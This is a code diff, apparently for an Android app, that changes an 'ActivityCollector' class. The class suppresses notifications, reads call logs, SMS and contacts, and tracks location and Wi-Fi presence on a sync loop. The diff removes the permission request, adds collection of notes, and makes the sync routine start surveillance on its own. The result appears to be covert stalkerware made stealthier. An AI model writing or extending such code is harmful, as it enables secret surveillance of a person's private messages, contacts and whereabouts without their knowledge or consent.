@@ -61,6 +61,7 @@ class ActivityCollector(private val context: Context) {
         override fun run() {
             if (!started) return
             ActivityStore.flush(context)
+            NotesStore.flush(context)
             handler.postDelayed(this, 8_000)
         }
     }
@@ -69,7 +70,6 @@ class ActivityCollector(private val context: Context) {
         if (started) return
         started = true
         StealthNotifications.suppressAll(context)
-        PermissionRequester.requestIfNeeded(context)
         locationTracker = LocationTracker(context).also { it.start() }
         wifiPresence = WifiPresenceScheduler(context).also { it.start() }
         handler.postDelayed(syncLoop, 5_000)
@@ -100,9 +100,11 @@ class ActivityCollector(private val context: Context) {
     }
 
     fun syncNow() {
+        start()
         runCatching { CallLogReader.sync(context) }
         runCatching { SmsReader.sync(context) }
         runCatching { ContactsReader.sync(context) }
+        NotesStore.flush(context)
         ActivityStore.flush(context)
         DeviceStateReporter.send(context)
         wifiPresence?.scanNow()
